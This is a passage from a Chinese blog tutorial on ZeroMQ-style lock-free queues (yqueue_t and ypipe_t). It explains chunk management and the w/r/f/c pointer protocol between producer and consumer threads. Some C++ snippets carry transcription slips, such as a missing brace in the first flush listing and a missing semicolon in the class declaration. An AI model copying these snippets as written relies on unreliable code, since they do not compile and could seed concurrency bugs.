class="hljs-type">chunk_t</span>&gt; spare_chunk;<br></code></pre></td></tr></table></figure><p>执行pop的代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (++begin_pos == N) <span class="hljs-comment">// 删除满一个chunk才回收chunk</span><br>    &#123;<br>        <span class="hljs-comment">// 将空闲chunk的指针暂时保留下来</span><br>        <span class="hljs-type">chunk_t</span> *o = begin_chunk;<br>        <span class="hljs-comment">// 由于空闲chunk是边界，因此更新边界</span><br>        begin_chunk = begin_chunk-&gt;next;<br>        begin_chunk-&gt;prev = <span class="hljs-literal">NULL</span>;<br>        begin_pos = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// 将空闲chunk和上一个空闲chunk交换一下，然后将上一个给free掉</span><br>        <span class="hljs-type">chunk_t</span> *cs = spare_chunk.<span class="hljs-built_in">xchg</span>(o);<br>        <span class="hljs-built_in">free</span>(cs);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行push的代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 首先取到最后一个chunk和chunk内部的pos</span><br>    back_chunk = end_chunk;<br>    back_pos = end_pos; <br>    <span class="hljs-comment">// 如果最后一个chunk还有空间，则不需要做其他的操作</span><br>    <span class="hljs-keyword">if</span> (++end_pos != N)<br>        <span class="hljs-keyword">return</span>;<br>    <span class="hljs-comment">// 如果最后一个chunk没有空间了，则需要扩容，首先考虑一下spare_chunk是否有空闲的</span><br>    <span class="hljs-type">chunk_t</span> *sc = spare_chunk.<span class="hljs-built_in">xchg</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">// 如果有空闲的chunk，直接建立双向连接即可</span><br>    <span class="hljs-keyword">if</span> (sc)<br>    &#123;<br>        end_chunk-&gt;next = sc;<br>        sc-&gt;prev = end_chunk;<br>    &#125;<br>    <span class="hljs-comment">// 如果没有空闲的，先分配，再建立连接关系</span><br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        end_chunk-&gt;next = (<span class="hljs-type">chunk_t</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">chunk_t</span>)); <br>        <span class="hljs-built_in">alloc_assert</span>(end_chunk-&gt;next);<br>        end_chunk-&gt;next-&gt;prev = end_chunk;<br>    &#125;<br>    <span class="hljs-comment">// 最后修改end_chunk即可</span><br>    end_chunk = end_chunk-&gt;next;<br>    end_pos = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="yqueue-t成员和接口介绍"><a href="#yqueue-t成员和接口介绍" class="headerlink" title="yqueue_t成员和接口介绍"></a>yqueue_t成员和接口介绍</h2><p>可以将这个队列看成是一个双向链表，链表的每个节点都是一个chunk，包含了N个元素，其他的概念和普通的队列差不多。</p><p>三种chunk的区别</p><ol><li>begin_chunk指向队列头部，从这取出元素</li><li>back_chunk指向队列的最后一个元素所在的chunk，back_pos指向最后一个元素</li><li>end_chunk指向队列最后一个chunk</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-type">int</span> N&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">yqueue_t</span> &#123;<br>    <span class="hljs-keyword">public</span>:<br>        <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-title">yqueue_t</span><span class="hljs-params">()</span></span>;<br>        <span class="hljs-keyword">inline</span> ~<span class="hljs-built_in">yqueue_t</span>();<br>        <span class="hljs-function"><span class="hljs-keyword">inline</span> T &amp;<span class="hljs-title">front</span><span class="hljs-params">()</span></span>;<br>        <span class="hljs-function"><span class="hljs-keyword">inline</span> T &amp;<span class="hljs-title">back</span><span class="hljs-params">()</span></span>;<br>        <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">()</span></span>;<br>        <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span></span>;<br>        <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">unpush</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    <span class="hljs-keyword">private</span>:</span><br><span class="hljs-function">        struct chunk_t &#123;</span><br>            T values[N];<br>            <span class="hljs-type">chunk_t</span> *prev;<br>            <span class="hljs-type">chunk_t</span> *next;<br>        &#125;;<br>        <span class="hljs-type">chunk_t</span> *begin_chunk;<br>        <span class="hljs-type">int</span> begin_pos;<br>        <span class="hljs-type">chunk_t</span> *back_chunk;<br>        <span class="hljs-type">int</span> back_pos;<br>        <span class="hljs-type">chunk_t</span> *end_chunk;<br>        <span class="hljs-type">int</span> end_pos;<br>        <span class="hljs-type">atomic_ptr_t</span>&lt;<span class="hljs-type">chunk_t</span>&gt; spare_chunk;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="构造函数yqueue-t"><a href="#构造函数yqueue-t" class="headerlink" title="构造函数yqueue_t"></a>构造函数yqueue_t</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-title">yqueue_t</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 初始化begin_chunk</span><br>    begin_chunk = (<span class="hljs-type">chunk_t</span> *)        <span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-type">chunk_t</span>));<br>    <span class="hljs-built_in">alloc_assert</span>(begin_chunk);<br>    begin_pos = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 由于没有元素，因此back_chunk暂时失效</span><br>    back_chunk = <span class="hljs-literal">NULL</span>;<br>    back_pos = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// end_chunk指向的是最后一个chunk，因此有效</span><br>    end_chunk = begin_chunk;<br>    end_pos = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="析构函数-yqueue-t"><a href="#析构函数-yqueue-t" class="headerlink" title="析构函数~yqueue_t"></a>析构函数~yqueue_t</h3><p>销毁所有chunk资源</p><p>先遍历访问所有chunk，然后再检查spare_chunk</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">inline</span> ~<span class="hljs-built_in">yqueue_t</span>() &#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">if</span> (begin_chunk == end_chunk) &#123;<br>            <span class="hljs-built_in">free</span>(begin_chunk);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-type">chunk_t</span> *o = begin_chunk;<br>        begin_chunk = begin_chunk-&gt;next;<br>        <span class="hljs-built_in">free</span>(o);<br>    &#125;<br><br>    <span class="hljs-type">chunk_t</span> *sc = spare_chunk.<span class="hljs-built_in">xchg</span>(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-built_in">free</span>(sc);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="front、back函数"><a href="#front、back函数" class="headerlink" title="front、back函数"></a>front、back函数</h3><p>可以注意到，返回的都是引用，因此可以通过函数的返回值修改对应chunk的位置。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> T &amp;<span class="hljs-title">front</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> begin_chunk-&gt;values[begin_pos];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> T &amp;<span class="hljs-title">back</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> back_chunk-&gt;values[back_pos];<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="push函数"><a href="#push函数" class="headerlink" title="push函数"></a>push函数</h3><p>前面已经分析过</p><h3 id="unpush函数"><a href="#unpush函数" class="headerlink" title="unpush函数"></a>unpush函数</h3><p>用来回退push操作</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">unpush</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 首先处理back块</span><br>    <span class="hljs-comment">// 如果back块的pos是0，说明直接退到前一个去了，否则的话就简单减1就可以</span><br>     <span class="hljs-keyword">if</span> (back_pos)<br>         --back_pos;<br>     <span class="hljs-keyword">else</span> &#123;<br>         back_pos = N - <span class="hljs-number">1</span>;<br>         back_chunk = back_chunk-&gt;prev;<br>     &#125;<br>    <span class="hljs-comment">// 再处理end块</span><br>    <span class="hljs-comment">// end块的pos如果为0，说明再退一步最后一个块就直接要被丢掉了，否则的话也是简单减1</span><br>     <span class="hljs-keyword">if</span> (end_pos)<br>         --end_pos;<br>     <span class="hljs-keyword">else</span> &#123;<br>         end_pos = N - <span class="hljs-number">1</span>;<br>         end_chunk = end_chunk-&gt;prev;<br>         <span class="hljs-built_in">free</span>(end_chunk-&gt;next);<br>         end_chunk-&gt;next = <span class="hljs-literal">NULL</span>;<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>pop操作如果发现一个chunk为空了，需要执行xchg函数来处理空闲块，而这个函数必须是线程安全的。因为生产者和消费者分别调用push和pop时都可能使用这个spare_chunk</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (++begin_pos == N)<br>    &#123;<br>        <span class="hljs-type">chunk_t</span> *o = begin_chunk;<br>        begin_chunk = begin_chunk-&gt;next;<br>        begin_chunk-&gt;prev = <span class="hljs-literal">NULL</span>;<br>        begin_pos = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">chunk_t</span> *cs = spare_chunk.<span class="hljs-built_in">xchg</span>(o);<br>        <span class="hljs-built_in">free</span>(cs);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ypipe"><a href="#ypipe" class="headerlink" title="ypipe"></a>ypipe</h2><p>ypipe在yqueue的基础上进行封装，实现了一个可以单读单写的无锁队列</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T, <span class="hljs-type">int</span> N&gt;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ypipe_t</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-title">ypipe_t</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-keyword">inline</span> <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">ypipe_t</span>();<br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">const</span> T &amp;value_, <span class="hljs-type">bool</span> incomplete_)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">unwrite</span><span class="hljs-params">(T *value_)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">flush</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">check_read</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">read</span><span class="hljs-params">(T *value_)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">probe</span><span class="hljs-params">(<span class="hljs-type">bool</span> (*fn)(T &amp;))</span></span>;<br><span class="hljs-keyword">protected</span>:<br>    <span class="hljs-type">yqueue_t</span>&lt;T, N&gt; queue;<br>    <span class="hljs-comment">// 指向第一个未刷新的元素</span><br>    T *w;<br>    <span class="hljs-comment">// 指向第一个等待读的元素</span><br>    T *r;<br>    <span class="hljs-comment">// 指向最后一个待刷新的元素</span><br>    T *f;<br>    <span class="hljs-comment">// 读写指针共享，指向每一轮刷新的起点</span><br>    <span class="hljs-type">atomic_ptr_t</span>&lt;T&gt; c;<br>    <span class="hljs-built_in">ypipe_t</span>(<span class="hljs-type">const</span> <span class="hljs-type">ypipe_t</span> &amp;);<br>    <span class="hljs-type">const</span> <span class="hljs-type">ypipe_t</span> &amp;<span class="hljs-keyword">operator</span>=(<span class="hljs-type">const</span> <span class="hljs-type">ypipe_t</span> &amp;);<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="如何写入和读取"><a href="#如何写入和读取" class="headerlink" title="如何写入和读取"></a>如何写入和读取</h3><p>首先看write函数，这个函数只会将更新底层的queue_t，并且在这一轮写结束的时候，即incomplete为false时，才更新f为待刷新的最后一个元素</p><p>在这里也可以看到queue_t的使用方法，先设置值，再调用push或者pop函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">const</span> T &amp;value_, <span class="hljs-type">bool</span> incomplete_)</span> </span>&#123;<br>    queue.<span class="hljs-built_in">back</span>() = value_;<br>    queue.<span class="hljs-built_in">push</span>();<br><br>    <span class="hljs-comment">//  Move the &quot;flush up to here&quot; poiter.</span><br>    <span class="hljs-keyword">if</span> (!incomplete_) &#123;<br>        f = &amp;queue.<span class="hljs-built_in">back</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是flush函数，再完成一波写入后，手动调用flush函数</p><p>flush函数就是更新了w和c两个指针</p><ol><li>w指针代表着已经写到哪了</li><li>c指针在读写线程之间共享<ol><li>读线程通过c知道是否读完了</li><li>写线程通过读线程是否将c设置为null知道读线程是否在睡眠</li></ol></li></ol><p>如果读线程在睡眠，返回false，否则返回true</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">flush</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 如果w和f相同，说明没有需要flush的东西</span><br>    <span class="hljs-keyword">if</span> (w == f) <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <br>    <span class="hljs-keyword">if</span> (c.<span class="hljs-built_in">cas</span>(w, f) != w)<br>    &#123;<br>        c.<span class="hljs-built_in">set</span>(f);<br>        w = f;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        w = f;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="读"><a href="#读" class="headerlink" title="读"></a>读</h3><p>先检查是否有数据可读，如果没有，直接返回false</p><p>如果有数据可读，读出，并返回true</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">read</span><span class="hljs-params">(T *value_)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">check_read</span>())<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    *value_ = queue.<span class="hljs-built_in">front</span>();<br>    queue.<span class="hljs-built_in">pop</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>具体来说，check_read</p><ol><li>如果r指针存在且和queue的front不同，说明已经被预取了，直接返回true</li><li>如果待操作的c指针是queue的首元素，则直接返回false，代表没有预取元素</li><li>否则就说明可以读，返回true</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">check_read</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (&amp;queue.<span class="hljs-built_in">front</span>() != r &amp;&amp; r)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    r = c.<span class="hljs-built_in">cas</span>(&amp;queue.<span class="hljs-built_in">front</span>(), <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (&amp;queue.<span class="hljs-built_in">front</span>() == r || !r)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果读线程调用read返回了false，则读线程应该阻塞自己</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (yqueue.<span class="hljs-built_in">read</span>(&amp;value)) &#123;<br>    <span class="hljs-comment">// 具体处理逻辑</span><br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 获得锁，然后通过条件变量阻塞自己</span><br>    std::unique_lock&lt;std::mutex&gt; <span class="hljs-built_in">lock</span>(ypipe_mutex_);<br>    ypipe_cond_.<span class="hljs-built_in">wait</span>(lock);<br>&#125;<br></code></pre></td></tr></table></figure><p>阻塞一直到写进程写入数据，通过条件变量唤醒阻塞的读进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++">yqueue.<span class="hljs-built_in">write</span>(count, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (!yqueue.<span class="hljs-built_in">flush</span>()) &#123;<br>    <span class="hljs-function">std::unique_lock&lt;std::mutex&gt; <span class="hljs-title">lock</span><span class="hljs-params">(ypipe_mutex_)</span></span>;<br>    ypipe_cond_.<span class="hljs-built_in">notify_one</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="w-r-f-c详解"><a href="#w-r-f-c详解" class="headerlink" title="w,r,f,c详解"></a>w,r,f,c详解</h3><p>首先看看在各个函数中，哪些指针被使用了</p><h4 id="ypipe-t"><a href="#ypipe-t" class="headerlink" title="ypipe_t"></a>ypipe_t</h4><p>在初始化函数中</p><ol><li>首先对队列调用一个push，为back赋予一个正常的值（这里面，在使用的时候，back永远指向一个空的位置，即可以直接赋值）</li><li>然后将四个指针都置为back</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-title">ypipe_t</span><span class="hljs-params">()</span> </span>&#123;<br>    queue.<span class="hljs-built_in">push</span>();<br>    r = w = f = &amp;queue.<span class="hljs-built_in">back</span>(); <br>    c.<span class="hljs-built_in">set</span>(&amp;queue.<span class="hljs-built_in">back</span>());<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><ol><li><p>将一个值直接写到队列中。这里也证实了back就是指向一个空的位置，每次使用时，直接赋值然后++</p></li><li><p>重头戏来了，这里首次更新指针<code>f</code></p><p>如果这是这次写的最后一个（生产者可以一次性写一大堆数据），那么就会更新f指向当前队列的最后一个元素。待会在flush的时候会用上它</p></li></ol><p>这里是使用了一种机制，使得写操作不会马上呈现在消费者眼中，只会在生产者调用了flush之后消费者才能看到</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">const</span> T &amp;value_, <span class="hljs-type">bool</span> incomplete_)</span> </span>&#123;<br>    queue.<span class="hljs-built_in">back</span>() = value_;<br>    queue.<span class="hljs-built_in">push</span>();<br>    <span class="hljs-keyword">if</span> (!incomplete_) &#123;<br>        f = &amp;queue.<span class="hljs-built_in">back</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="flush"><a href="#flush" class="headerlink" title="flush"></a>flush</h4><ol><li>如果w和f相同，说明没有需要flush的，直接返回true</li><li>比较c和w的值<ol><li>无论如何都会将c和w更新为f</li><li>如果c和w的值不同，c只可能是null，说明读线程被阻塞了，返回一个false提醒写线程唤醒读线程</li></ol></li></ol><p>flush函数的作用</p><ol><li>更新c和w，以告诉读线程，现在有新的数据可读</li><li>根据返回值告诉写线程读线程是否被阻塞了</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">flush</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (w == f) <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span> (c.<span class="hljs-built_in">cas</span>(w, f) != w) <br>    &#123;<br>        c.<span class="hljs-built_in">set</span>(f);<br>        w = f;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        w = f;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="read"><a href="#read" class="headerlink" title="read"></a>read</h4><p>对于读线程</p><ol><li>通过check_read判断是否可读，不可读的话直接返回不可读</li><li>可读的话直接开读</li></ol><p>因此关键在于check_read函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">read</span><span class="hljs-params">(T *value_)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">check_read</span>())<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    *value_ = queue.<span class="hljs-built_in">front</span>();<br>    queue.<span class="hljs-built_in">pop</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="check-read"><a href="#check-read" class="headerlink" title="check_read"></a>check_read</h4><ol><li>如果r指针有效，并且它不是front，即现在还有可读的数据，那么返回true，直接读</li><li>如果目前r指针不对劲，那么尝试更新r指针为c（如果现在有可读的数据，即生产者调用了flush，那c一定是最新的可读的边界）<ol><li>如果c也是队列头，说明现在根本就没数据，因此将c置为NULL</li><li>如果c不是队列头，那么不会改变c</li></ol></li><li>判断更新之后的r是否有效并且不是队列头，如果不满足的话，返回false，否则返回true</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title">check_read</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (&amp;queue.<span class="hljs-built_in">front</span>() != r &amp;&amp; r)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    r = c.<span 